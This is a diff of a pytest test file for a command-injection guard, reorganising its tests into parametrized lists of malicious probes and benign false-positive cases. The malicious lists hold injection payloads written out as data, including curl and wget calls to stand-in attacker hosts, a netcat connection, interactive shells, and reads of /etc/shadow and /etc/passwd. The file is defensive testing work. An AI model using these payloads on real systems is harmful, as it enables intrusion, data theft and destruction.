@@ -1,5 +1,10 @@
+import pytest
 from adiuvare import Guard
 
+
+# ---------------------------------------------------------------------------
+# Helpers
+# ---------------------------------------------------------------------------
 
 def _check(payload: str):
     guard = Guard()
@@ -11,130 +16,97 @@ def _is_flagged(payload: str) -> bool:
     return event is not None and event.score > 0.0
 
 
-class TestCmdSepSeparators:
+# ---------------------------------------------------------------------------
+# Malicious probes — all must be flagged
+# ---------------------------------------------------------------------------
 
-    def test_and_and_separator_curl(self):
-        assert _is_flagged("q=hello && curl http://evil.example/x") is True
+# Shell separator (&&, ||, ;, |) followed by a dangerous command.
+_SEP_PROBES = [
+    "q=hello && curl http://evil.example/x",
+    "name=foo || wget http://attacker.example/s.sh",
+    "id=1; bash -i",
+    "file=report.pdf; sh /tmp/x",
+    "input=data | python -c 'import os;os.system(\"id\")'",
+    "msg=hi | nc 10.0.0.1 4444",
+    "search=test && php -r 'system(\"id\");'",
+    "q=x | perl -e 'exec(\"/bin/sh\")'",
+    "file=log.txt | rm -rf /tmp/work",
+]
 
-    def test_or_or_separator_wget(self):
-        assert _is_flagged("name=foo || wget http://attacker.example/s.sh") is True
+# $() subshell substitution.
+_SUBSHELL_PROBES = [
+    "url=$(curl http://169.254.169.254/latest/meta-data/)",
+    "data=$(wget -qO- http://attacker.example/token)",
+    "cmd=$(bash -c 'whoami')",
+    "out=$(python -c 'import socket;print(socket.gethostname())')",
+    "x=$(sh -i 2>&1)",
+]
 
-    def test_semicolon_separator_bash(self):
-        assert _is_flagged("id=1; bash -i") is True
+# Backtick substitution.
+_BACKTICK_PROBES = [
+    "name=`cat /etc/shadow`",
+    "token=`curl http://evil.example/steal`",
+    "file=`wget -O /tmp/shell http://attacker.example/s`",
+    "user=`id`",
+    "user=`whoami`",
+    "shell=`bash -i`",
+]
 
-    def test_semicolon_separator_sh(self):
-        assert _is_flagged("file=report.pdf; sh /tmp/x") is True
-
-    def test_pipe_separator_python(self):
-        assert _is_flagged("input=data | python -c 'import os;os.system(\"id\")'") is True
-
-    def test_pipe_separator_nc(self):
-        assert _is_flagged("msg=hi | nc 10.0.0.1 4444") is True
-
-    def test_and_and_separator_php(self):
-        assert _is_flagged("search=test && php -r 'system(\"id\");'") is True
-
-    def test_pipe_separator_perl(self):
-        assert _is_flagged("q=x | perl -e 'exec(\"/bin/sh\")'") is True
-
-    def test_pipe_separator_rm(self):
-        assert _is_flagged("file=log.txt | rm -rf /tmp/work") is True
-
-
-class TestCmdSubshell:
-
-    def test_subshell_curl(self):
-        assert _is_flagged("url=$(curl http://169.254.169.254/latest/meta-data/)") is True
-
-    def test_subshell_wget(self):
-        assert _is_flagged("data=$(wget -qO- http://attacker.example/token)") is True
-
-    def test_subshell_bash(self):
-        assert _is_flagged("cmd=$(bash -c 'whoami')") is True
-
-    def test_subshell_python(self):
-        assert _is_flagged("out=$(python -c 'import socket;print(socket.gethostname())')") is True
-
-    def test_subshell_sh(self):
-        assert _is_flagged("x=$(sh -i 2>&1)") is True
+# /etc/passwd access via different separators.
+_PASSWD_PROBES = [
+    "; cat /etc/passwd",
+    "&& cat /etc/passwd",
+    "| cat /etc/passwd",
+]
 
 
-class TestCmdBacktick:
-
-    def test_backtick_cat(self):
-        assert _is_flagged("name=`cat /etc/shadow`") is True
-
-    def test_backtick_curl(self):
-        assert _is_flagged("token=`curl http://evil.example/steal`") is True
-
-    def test_backtick_wget(self):
-        assert _is_flagged("file=`wget -O /tmp/shell http://attacker.example/s`") is True
-
-    def test_backtick_id(self):
-        assert _is_flagged("user=`id`") is True
-
-    def test_backtick_whoami(self):
-        assert _is_flagged("user=`whoami`") is True
-
-    def test_backtick_bash(self):
-        assert _is_flagged("shell=`bash -i`") is True
+@pytest.mark.parametrize("payload", _SEP_PROBES)
+def test_cmd_separator_probes_flagged(payload):
+    assert _is_flagged(payload) is True
 
 
-class TestEtcPasswdProbes:
-
-    def test_semicolon_cat_passwd(self):
-        assert _is_flagged("; cat /etc/passwd") is True
-
-    def test_and_and_cat_passwd(self):
-        assert _is_flagged("&& cat /etc/passwd") is True
-
-    def test_pipe_cat_passwd(self):
-        assert _is_flagged("| cat /etc/passwd") is True
+@pytest.mark.parametrize("payload", _SUBSHELL_PROBES)
+def test_cmd_subshell_probes_flagged(payload):
+    assert _is_flagged(payload) is True
 
 
-class TestBenignShellDocumentation:
+@pytest.mark.parametrize("payload", _BACKTICK_PROBES)
+def test_cmd_backtick_probes_flagged(payload):
+    assert _is_flagged(payload) is True
 
-    def test_fenced_bash_block(self):
-        payload = "```bash\ncurl https://example.com/api\n```"
-        gate, _ = _check(payload)
-        assert gate.passed is True
 
-    def test_plain_prose_about_curl(self):
-        payload = "Use curl to fetch remote resources in your scripts."
-        gate, _ = _check(payload)
-        assert gate.passed is True
+@pytest.mark.parametrize("payload", _PASSWD_PROBES)
+def test_etc_passwd_probes_flagged(payload):
+    assert _is_flagged(payload) is True
 
-    def test_plain_prose_about_wget(self):
-        payload = "wget is a non-interactive network downloader."
-        gate, _ = _check(payload)
-        assert gate.passed is True
 
-    def test_plain_prose_about_bash(self):
-        payload = "bash is the GNU Bourne Again shell."
-        gate, _ = _check(payload)
-        assert gate.passed is True
+# ---------------------------------------------------------------------------
+# Benign payloads — must NOT be flagged (false-positive boundary)
+#
+# These assert that plain prose, documentation snippets, and legitimate URLs
+# that merely mention shell command names or operators are not blocked.
+# ---------------------------------------------------------------------------
 
-    def test_plain_prose_about_python(self):
-        payload = "python scripts can be run with the python interpreter."
-        gate, _ = _check(payload)
-        assert gate.passed is True
+_BENIGN_PAYLOADS = [
+    # Fenced code block — context makes the intent clear.
+    "```bash\ncurl https://example.com/api\n```",
+    # Plain prose that names commands but has no separator + command pattern.
+    "Use curl to fetch remote resources in your scripts.",
+    "wget is a non-interactive network downloader.",
+    "bash is the GNU Bourne Again shell.",
+    "python scripts can be run with the python interpreter.",
+    # | appearing as a prose operator, not a shell pipe into a command.
+    "The pipe operator | is used to chain commands in a shell tutorial.",
+    # for-loop in a description — separator present but no dangerous command follows.
+    "In a shell script you might write: for f in *.log; do echo $f; done",
+    # && in a URL query string — not a shell context.
+    "https://example.com/search?q=foo&&page=2",
+    # Command name as a positional argument, no preceding separator.
+    "Example: python manage.py runserver",
+]
 
-    def test_pipe_operator_in_prose(self):
-        payload = "The pipe operator | is used to chain commands in a shell tutorial."
-        gate, _ = _check(payload)
-        assert gate.passed is True
 
-    def test_shell_history_description(self):
-        payload = "In a shell script you might write: for f in *.log; do echo $f; done"
-        gate, _ = _check(payload)
-        assert gate.passed is True
-
-    def test_double_ampersand_in_url_query(self):
-        payload = "https://example.com/search?q=foo&&page=2"
-        gate, _ = _check(payload)
-        assert gate.passed is True
-
-    def test_python_import_in_docstring(self):
-        payload = "Example: python manage.py runserver"
-        gate, _ = _check(payload)
-        assert gate.passed is True
+@pytest.mark.parametrize("payload", _BENIGN_PAYLOADS)
+def test_benign_payloads_not_flagged(payload):
+    gate, _ = _check(payload)
+    assert gate.passed is True
